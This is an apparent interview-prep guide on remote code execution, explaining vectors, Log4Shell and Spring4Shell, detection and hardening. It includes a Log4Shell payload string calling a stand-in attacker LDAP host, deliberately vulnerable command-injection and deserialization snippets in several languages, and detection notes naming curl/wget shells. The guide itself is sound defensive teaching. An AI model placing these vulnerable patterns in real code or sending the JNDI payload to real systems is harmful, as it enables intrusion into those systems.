# Remote Code Execution (RCE) - Comprehensive Guide

## At a glance

**Remote code execution (RCE)** means an attacker can **cause your system to run attacker-chosen code or system commands** on a machine you control—typically the **application server**, **worker**, or **container**. Vectors include **command injection**, **unsafe deserialization**, **template injection**, **expression language** injection, **known CVEs** in dependencies, and **misconfigured** plugins/runtimes. **Impact** scales with **privilege**, **network reachability**, and **secrets** on the host—not every RCE is instant “root,” but it is almost always **critical** from a risk standpoint.

Aligned with the **[Content Mastery Framework](../Interview%20Preparation/Content%20Mastery%20Framework.md)**.

---

## Learning outcomes

- Map **major RCE families** (injection vs gadget chains vs memory corruption at high level).
- Explain **defense layers**: safe APIs, sandboxing, dependency hygiene, **WAF** as secondary.
- Discuss **incident** steps: scope, contain, rotate secrets, patch, hunt persistence.
- Answer **senior** trade-offs: shell vs `exec`, containers vs VMs, **read-only** FS.

---

## Prerequisites

- **[SQL Injection](../SQL%20Injection/)**, **[SSRF](../SSRF/)**, **[Insecure Deserialization](../Insecure%20Deserialization/)**, **[SSTI](../Server-Side%20Template%20Injection%20(SSTI)/)** — common **paths** to RCE.
- **[Container Security](../Container%20Security/)** — blast radius containment.

---

## L1 — What counts as RCE?

**RCE:** Attacker supplies input that becomes **code execution** in the **victim process** (language VM, shell, template engine, expression evaluator, or native code via memory corruption).

**Not always RCE:** **SQLi** that only reads data; **XSS** in browser (different trust boundary)—unless interviewer says “RCE on admin’s browser” via **deserialization** in a browser context (rare framing).

---

## L2 — Primary vectors (interview taxonomy)

| Family | Mechanism sketch |
|--------|------------------|
| **OS command injection** | User input passed to `shell=True`, `exec()`, `os.system`, `Process.start` with concatenation |
| **Code injection** | `eval`, unsafe **dynamic** `import`, **expression languages** (OGNL, SpEL, EL) |
| **Deserialization** | Untrusted blob → object graph → **gadget chain** → runtime primitive |
| **SSTI** | User controls template → **sandbox escape** |
| **Dependency / supply chain** | Vulnerable library **JNDI** lookup, **Log4j**, **ImageMagick**, **Struts**, etc. |
| **File upload + execution** | Web shell in executable path; **polyglot** files |
| **Memory corruption** | Buffer overflow, UAF → shellcode (often **exploit dev** track; still nameable in AppSec) |

---

## L2 — Minimal vulnerable vs safe patterns

### Command injection (Python — illustrative)

**Vulnerable:**

```python
import os
user = request.args.get("q")
os.system(f"convert input.png -resize 50% out.png {user}")  # NEVER
```

**Safer:** Use **`subprocess.run`** with **argument list**, **no shell**, **fixed** binary path; validate **allowlisted** flags only.

```python
subprocess.run(["/usr/bin/convert", "input.png", "-resize", "50%", "out.png"], check=True)
```

### Java JNDI / Log4j class of issues (pattern)

Untrusted data triggers a **lookup** to an attacker server → **loads** attacker-controlled class. **Fix:** patch runtime, **disable** remote JNDI/class loading, **network egress** restrictions.

---

## Named examples (verify versions in real incidents)

| Example | Primitive |
|---------|-----------|
| **Log4Shell (Log4j CVE-2021-44228)** | JNDI lookup from log message → remote class load |
| **Spring4Shell (CVE-2022-22965)** | Spring MVC data binding / classloader access on JDK 9+ |
| **ImageTragick (CVE-2016-3714)** | ImageMagick delegate → shell command execution |
| **Shellshock (CVE-2014-6271)** | Bash env var function injection |
| **ProxyShell / ProxyLogon** | Exchange chain → RCE (enterprise IR stories) |
| **Citrix Bleed (CVE-2023-4966)** | Buffer overread → session token leak → follow-on access |
| **Deserialization chains** | **ysoserial**, **marshalsec** (Java); **pickle** abuse (Python) |

Use **vendor advisories** and **NVD** for exact CVE metadata when preparing employer-specific loops.

---

## L2 — CVE walkthrough: Log4Shell (architecture-level)

**Flow:** Attacker sends `${jndi:ldap://attacker/a}` in a field that gets **logged** → Log4j **lookup** resolves JNDI → attacker-controlled **LDAP** returns **Reference** with **factory** → JVM loads **remote class** → **RCE**.

**Containment (first 24h):** WAF rules (temporary), **disable lookups** (`log4j2.formatMsgNoLookups`), **patch** to fixed versions, **hunt** outbound LDAP/RMI/DNS from app subnets, **rotate** secrets on affected hosts.

**Interview lesson:** **Never evaluate** untrusted strings as **active resolution** paths (JNDI, EL, templates, scripts).

---

## L2 — CVE walkthrough: Spring4Shell (pattern)

**Pattern:** Attacker manipulates **request parameters** bound to **Java objects** to reach **ClassLoader** / **access rules** on vulnerable Spring + JDK combinations.

**Fix:** Patch Spring; **WAF** secondary; **reduce** exposed actuator endpoints; **principle of least privilege** on app process.

---

## L2 — Additional language sinks

### Node.js

```javascript
// Vulnerable — never pass user input to eval or child_process with shell
const user = req.query.cmd;
require('child_process').exec(`convert ${user}`, ...);  // command injection

// Safer
const { execFile } = require('child_process');
execFile('/usr/bin/convert', ['input.png', 'out.png'], ...);
```

### Java

```java
// Vulnerable patterns (search in reviews)
Runtime.getRuntime().exec("sh -c " + userInput);
new ObjectInputStream(untrustedStream).readObject();
```

### Go

```go
// Vulnerable — shell invocation with user string
exec.Command("sh", "-c", "ping "+host).Run()
// Safer
exec.Command("ping", "-c", "1", host).Run()
```

---

## L2 — Tooling interviewers expect

| Tool | Use |
|------|-----|
| **Semgrep / CodeQL** | Find exec, eval, deserialization sinks |
| **Burp Scanner** | Confirm web RCE chains |
| **ysoserial** (lab) | Demonstrate Java gadget *existence* |
| **nuclei** | Known CVE templates |
| **Falco / EDR** | Detect shell from app user |

---

## L3 — Detection

- **Logs:** unexpected **child processes**, **`/bin/sh`**, **`curl`/`wget`** from app user.
- **EDR / Falco:** shell spawned by **java**, **node**, **ruby**.
- **Static analysis:** **Semgrep** rules for `exec`, `eval`, `pickle.loads`, `ObjectInputStream`, `yaml.load` unsafe patterns.
- **Dependencies:** **SCA** (Snyk, Dependabot, OSV) for **known RCE CVEs**.

---

## L3 — Mitigations (tiered)

1. **Eliminate shell:** **Never** pass user data to a shell; **argv arrays** only.  
2. **No `eval` on untrusted input.**  
3. **Deserialization:** **sign** payloads, use **JSON** + DTOs, **avoid** native binary formats from users.  
4. **Templates:** **logic-less** templates or **strict** sandboxes.  
5. **Patch** dependencies **fast** on RCE CVEs; **SBOM** + **automated** PRs.  
6. **Runtime:** **non-root** containers, **read-only rootfs**, **seccomp/AppArmor**, **egress** deny-by-default.  
7. **Secrets:** assume **exfil** after RCE—**rotate**, **short-lived** credentials.

---

## L3 — Why “we have a WAF” fails interviews

WAFs **miss** deserialization, **file** bugs, **internal** admin plugins, and **novel** gadgets. **Depth:** code + dependency + **runtime** hardening.

---

## Hands-on (authorized labs)

- **DVWA** / **WebGoat** command injection modules.  
- **PortSwigger** SSTI / deserialization labs.  
- Local **Log4j** test harness in an **isolated** VM (lab only).

**Tools:** `semgrep`, `codeql`, `bandit` (Python), dependency scanners.

---

## L4 — Interview clusters

### Junior

- Define RCE; difference from **SQLi** reading data.

### Mid

- Safe **`subprocess`** pattern; why **shell=True** is toxic.

### Senior

- **Container** breakout vs **app** RCE—what limits impact?  
- **Log4j** response in **first 24 hours** (contain, patch, hunt, rotate).

### Staff

- **Org-wide** control: **default-deny egress**, **Falco** alerts, **SLSA** / provenance for **artifacts**.

---

## Authoritative references

- **CWE-78** (OS command injection), **CWE-94** (code injection), **CWE-502** (unsafe deserialization)  
- **OWASP** cheat sheets: **Injection**, **Deserialization**  
- **NIST** SSDF themes for **patch** and **build** security

---

## Cross-links

- **[Insecure Deserialization](../Insecure%20Deserialization/)**  
- **[Server-Side Template Injection (SSTI)](../Server-Side%20Template%20Injection%20(SSTI)/)**  
- **[File Upload Security](../File%20Upload%20Security/)**  
- **[Software Supply Chain Security](../Software%20Supply%20Chain%20Security/)**  
- **[Production Security Incident Response](../Production%20Security%20Incident%20Response/)**  
- **[Exploit Development](../Exploit%20Development/)** (mitigation-aware depth)

---

## Verification checklist

- [ ] Explain **three** distinct paths to RCE **without** saying “injection” only once.  
- [ ] Whiteboard **safe** vs **unsafe** subprocess.  
- [ ] Walk **Log4j** at **architecture** level (lookup → load → code).  
- [ ] List **four** **container** hardening controls that **limit** post-RCE.
